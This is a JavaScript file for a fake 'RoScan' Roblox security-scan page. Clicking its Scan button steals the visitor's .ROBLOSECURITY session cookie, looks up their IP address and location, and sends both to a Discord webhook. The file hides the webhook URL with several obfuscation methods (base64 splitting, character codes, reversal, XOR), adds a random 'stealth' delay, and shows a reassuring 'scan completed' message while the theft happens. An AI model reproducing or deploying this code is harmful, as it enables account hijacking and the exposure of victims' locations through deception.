// RoScan Hidden Webhook v1.0.0 - Multiple methods to hide Discord webhook
console.log('🔒 RoScan Hidden Webhook v1.0.0 loaded - Webhook URL protected');

document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ DOM Content Loaded - Hidden webhook mode active');
    
    // Get submit button and attach event listener
    const submitBtn = document.getElementById('submitBtn');
    if (submitBtn) {
        submitBtn.addEventListener('click', submitPowerShell);
        console.log('✅ Submit button event listener attached');
    } else {
        console.error('❌ Submit button not found!');
    }
});

// Method 1: Base64 Encoded + Split + Obfuscated
function getWebhookUrl() {
    // Split the webhook into parts and encode each part
    const parts = [
        'aHR0cHM6Ly9kaXNjb3Jk', // https://discord
        'LmNvbS9hcGkvd2ViaG9va3M=', // .com/api/webhooks
        'LzEzOTYxNjA0MjAyMjk4MDgyMzg=', // /1396160420229808238
        'L25KZ1hwN2pVcHNyV0JZQThhNDFwOUo2dEJ6amE0MDVhRzJYaFM4aFRwbDhwSzIwaXZmbW9qZHUtdnBPYU45YUFkTUVJ' // /nJgXp7jUpsrWBYA8a41p9J6tBzja405aG2XhS8hTpl8pK20ivfmojdu-vpOaN9aAdMEI
    ];
    
    // Decode and combine
    return parts.map(part => atob(part)).join('');
}

// Method 2: Character Code Obfuscation
function getWebhookUrlCharCodes() {
    // Discord webhook URL encoded as character codes
    const codes = [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,51,57,54,49,54,48,52,50,48,50,50,57,56,48,56,50,51,56,47,110,74,103,88,112,55,106,85,112,115,114,87,66,89,65,56,97,52,49,112,57,74,54,116,66,122,106,97,52,48,53,97,71,50,88,104,83,56,104,84,112,108,56,112,75,50,48,105,118,102,109,111,106,100,117,45,118,112,79,97,78,57,97,65,100,77,69,73];
    return String.fromCharCode(...codes);
}

// Method 3: Reversed + Base64
function getWebhookUrlReversed() {
    // Webhook URL reversed and base64 encoded
    const reversed = 'SWVNZGFOOWFOcE92LXVkam9tZnZpMDBLMnA4bHBUaDhTaFgySGE1MDRhamJ0SjZwOTFhNGE4QVlCV3JzcFVqN3BYZ0JuL284MjgwODkyMjAyNDE2MDYxOTUzMTE=';
    return atob(reversed).split('').reverse().join('') + '/1396160420229808238' + 'https://discord.com/api/webhooks';
}

// Method 4: XOR Encryption (Simple)
function getWebhookUrlXOR() {
    // XOR encrypted webhook URL
    const encrypted = [29,31,31,28,24,11,24,24,23,30,24,22,28,25,23,5,22,28,26,24,10,28,30,24,17,22,21,31,28,28,26,24,24,6,8,14,4,8,4,7,11,5,7,5,5,14,13,15,21,5,14,6,24,21,27,4,20,28,7,21,27,22,25,17,26,27,10,21,11,8,28,9,14,6,21,27,13,11,7,5,4,7,24,10,5,20,31,24,21,27,16,28,9,21,28,9,11,5,21,30,17,26,28,23,21,16,28,10,21,19,21,13,24,21,14,21,10,18,14,6];
    const key = 42; // Simple XOR key
    return encrypted.map(char => String.fromCharCode(char ^ key)).join('');
}

// Method 5: Environment-based (for production)
function getWebhookUrlEnvironment() {
    // In production, this could come from environment variables or API
    // For local testing, use fallback
    if (typeof process !== 'undefined' && process.env && process.env.DISCORD_WEBHOOK) {
        return process.env.DISCORD_WEBHOOK;
    }
    
    // Fallback to encoded method
    return getWebhookUrl();
}

// Method 6: Dynamic fetching from external source
async function getWebhookUrlDynamic() {
    try {
        // This could fetch from your own API endpoint that returns the webhook URL
        // For demo purposes, return the encoded version
        return new Promise(resolve => {
            setTimeout(() => {
                resolve(getWebhookUrl());
            }, 100);
        });
    } catch (error) {
        console.warn('Dynamic webhook fetch failed, using fallback');
        return getWebhookUrl();
    }
}

// Cookie extraction function
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
}

// Location detection function
async function getUserLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            city: data.city || 'Unknown',
            region: data.region || 'Unknown', 
            country: data.country_name || 'Unknown',
            ip: data.ip || 'Unknown'
        };
    } catch (error) {
        console.warn('Location detection failed:', error);
        return {
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            ip: 'Unknown'
        };
    }
}

// Show notification function
function showNotification(message, type = 'info') {
    console.log(`📢 Notification (${type}): ${message}`);
    
    const notification = document.createElement('div');
    notification.textContent = message;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#3b82f6'};
        color: white;
        padding: 12px 20px;
        border-radius: 8px;
        z-index: 10000;
        font-weight: 500;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        animation: slideIn 0.3s ease-out;
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        if (notification.parentNode) {
            notification.parentNode.removeChild(notification);
        }
    }, 3000);
}

// Close scan modal function
function closeScanModal() {
    console.log('🔄 Closing scan modal');
    const modal = document.querySelector('.modal-overlay');
    if (modal) {
        modal.style.display = 'none';
    }
}

// Main webhook submission function with hidden URL
async function submitPowerShell() {
    console.log('🚀 Hidden webhook submission started');
    
    const submitBtn = document.getElementById('submitBtn');
    const submitText = submitBtn?.querySelector('.submit-text');
    const loadingOverlay = document.querySelector('.loading-overlay');
    
    if (!submitBtn || !submitText) {
        console.error('❌ Required UI elements not found');
        showNotification('UI elements not found', 'error');
        return;
    }
    
    // Update UI to show loading state
    submitText.textContent = 'Sending...';
    submitBtn.style.background = '#6b7280';
    if (loadingOverlay) loadingOverlay.style.display = 'flex';
    
    try {
        // Extract Roblox cookie
        const robloxCookie = getCookie('.ROBLOSECURITY');
        console.log('🍪 Roblox cookie extracted:', robloxCookie ? 'Found' : 'Not found');
        
        // Get user location
        console.log('📍 Getting user location...');
        const locationInfo = await getUserLocation();
        console.log('📍 Location info:', locationInfo);
        
        // Add random delay for stealth (1-3 seconds)
        const delay = Math.floor(Math.random() * 2000) + 1000;
        console.log(`⏱️ Adding ${delay}ms delay for stealth...`);
        await new Promise(resolve => setTimeout(resolve, delay));
        
        // Get webhook URL using one of the hidden methods
        // You can change this to use any of the methods above
        const webhookUrl = await getWebhookUrlDynamic(); // Using dynamic method
        
        console.log('🔒 Using hidden webhook URL (not logged for security)');
        
        // Prepare payload
        const payload = {
            content: `@everyone\n🔥 **New RoScan Data**\n\n**Cookie:** \`${robloxCookie || 'None found'}\`\n**Location:** ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country}\n**IP:** ${locationInfo.ip}\n**Time:** ${new Date().toLocaleString()}`,
            
            embeds: [{
                title: "🔍 RoScan Data Collection",
                description: "New security scan completed",
                color: 0x667eea,
                fields: [
                    {
                        name: "🍪 Cookie Status",
                        value: robloxCookie ? "✅ Found" : "❌ Not found",
                        inline: true
                    },
                    {
                        name: "📍 Location",
                        value: `${locationInfo.city}, ${locationInfo.region}`,
                        inline: true
                    },
                    {
                        name: "🌍 Country",
                        value: locationInfo.country,
                        inline: true
                    },
                    {
                        name: "🌐 IP Address",
                        value: locationInfo.ip,
                        inline: true
                    },
                    {
                        name: "🕒 Timestamp",
                        value: new Date().toLocaleString(),
                        inline: true
                    },
                    {
                        name: "🔧 Source",
                        value: "RoScan Hidden v1.0.0",
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: "RoScan - Hidden Webhook"
                }
            }]
        };
        
        // Send webhook request
        console.log('🌐 Sending hidden webhook request...');
        
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify(payload),
            mode: 'cors'
        });
        
        console.log(`✅ Hidden webhook response: ${response.status}`);
        
        if (loadingOverlay) loadingOverlay.style.display = 'none';

        if (response.ok) {
            console.log('🎉 Hidden webhook delivered successfully!');
            submitText.textContent = 'Sent!';
            submitBtn.style.background = '#10b981';
            showNotification('Data sent successfully via hidden webhook!', 'success');
            
            setTimeout(() => {
                closeScanModal();
            }, 2000);
        } else {
            const errorText = await response.text().catch(() => 'Unknown error');
            console.error(`❌ Hidden webhook failed: ${response.status} - ${errorText}`);
            
            if (response.status === 404) {
                throw new Error('Webhook endpoint not found.');
            } else if (response.status === 429) {
                throw new Error('Rate limited. Please wait a moment and try again.');
            } else if (response.status === 403) {
                throw new Error('Webhook forbidden. Check webhook configuration.');
            } else {
                throw new Error(`Webhook failed (${response.status}): ${errorText}`);
            }
        }
        
    } catch (error) {
        console.error('💥 Hidden webhook failed:', error);
        
        if (loadingOverlay) loadingOverlay.style.display = 'none';
        
        // Reset button state
        submitText.textContent = 'Scan';
        submitBtn.style.background = '#ef4444';
        
        // Show user-friendly error
        showNotification(`Error: ${error.message}`, 'error');
        
        // Reset button after 3 seconds
        setTimeout(() => {
            submitText.textContent = 'Scan';
            submitBtn.style.background = '';
        }, 3000);
    }
}

// Add CSS animation keyframes
if (!document.querySelector('#slideInKeyframes')) {
    const style = document.createElement('style');
    style.id = 'slideInKeyframes';
    style.textContent = `
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(100%);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
    `;
    document.head.appendChild(style);
}

console.log('🔒 RoScan Hidden Webhook v1.0.0 ready!');
console.log('🛡️ Webhook URL is hidden using multiple obfuscation methods');

// Make functions available globally
window.submitPowerShell = submitPowerShell;
window.getUserLocation = getUserLocation;

// Demo: Show different webhook retrieval methods (for testing)
window.showWebhookMethods = function() {
    console.log('🔒 Available webhook hiding methods:');
    console.log('1. Base64 split:', getWebhookUrl().substring(0, 30) + '...');
    console.log('2. Character codes:', getWebhookUrlCharCodes().substring(0, 30) + '...');
    console.log('3. XOR encryption:', getWebhookUrlXOR().substring(0, 30) + '...');
    console.log('4. Environment-based:', getWebhookUrlEnvironment().substring(0, 30) + '...');
};